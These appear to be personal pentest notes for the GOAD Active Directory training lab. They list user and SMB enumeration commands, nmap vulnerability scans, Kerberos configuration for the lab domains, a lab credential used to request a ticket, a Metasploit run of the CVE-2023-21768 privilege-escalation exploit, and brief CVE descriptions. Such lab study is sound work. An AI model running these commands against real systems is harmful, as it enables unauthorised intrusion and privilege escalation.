
enum4linux -U <dc-ip> | grep 'user:'
cme smb <ip> -u <user> -p '<password>' --users
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>', userdb=<users_list_file>" <ip>
cme smb <ip_range>  # enumerate smb hosts
nmap -sP -p <ip>  # ping scan
nmap -PN -sV --top-ports 50 --open <ip>  # quick scan
nmap -PN --script smb-vuln* -p139,445 <ip>  # search smb vuln
nmap -PN -sC -sV <ip>  # classic scan
nmap -PN -sC -sV -p- <ip>  # full scan
nmap -sU -sC -sV <ip>  # udp scan

---------
cme smb 192.168.56.1/24
---------
nmcli dev show eth0  # show domain name & dns
nslookup -type=SRV _ldap._tcp.dc._msdcs.//DOMAIN/
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
---------
setup /etc/hosts and kerberos

# /etc/hosts
# GOAD
192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
192.168.56.12   essos.local meereen.essos.local meereen
192.168.56.22   castelblack.north.sevenkingdoms.local castelblack
192.168.56.23   braavos.essos.local braavos

sudo apt install krb5-user

---
/etc/krb5.conf 

[libdefaults]
  default_realm = essos.local
  kdc_timesync = 1
  ccache_type = 4
  forwardable = true
  proxiable = true
  fcc-mit-ticketflags = true
[realms]
  north.sevenkingdoms.local = {
      kdc = winterfell.north.sevenkingdoms.local
      admin_server = winterfell.north.sevenkingdoms.local
  }
  sevenkingdoms.local = {
      kdc = kingslanding.sevenkingdoms.local
      admin_server = kingslanding.sevenkingdoms.local
  }
  essos.local = {
      kdc = meereen.essos.local
      admin_server = meereen.essos.local
  }
...
---

dpkg-reconfigure krb5-config
getTGT.py essos.local/khal.drogo:horse

---
msfconsole -q -x "search platform:windows type:exploit; exit"
msfconsole -q -x "use exploit/windows/local/cve_2023_21768_afd_lpe; set SESSION 1; run; exit"

CVE-2023-21768: This local privilege escalation exploit targets a vulnerability in the Windows Ancillary Function Driver for Winsock (afd.sys). It leverages a kernel write-where primitive to manipulate I/O ring structures, granting elevated privileges to NT AUTHORITY\SYSTEM. This exploit is effective on Windows 11 22H2 up to build 22621.963, prior to the January 2023 patches. 
GITHUB.COM

CVE-2023-38146: This arbitrary code execution vulnerability involves Windows 11 theme files. When an unpatched Windows 11 system loads a theme file referencing an msstyles file with a PACKME_VERSION of 999, it attempts to load an accompanying DLL ending in _vrf.dll. If this DLL is malicious and properly signed, it can lead to arbitrary code execution. 
---

export KRB5CCNAME=/workspace/khal.drogo.ccache 
smbclient.py -k @braavos.essos.local


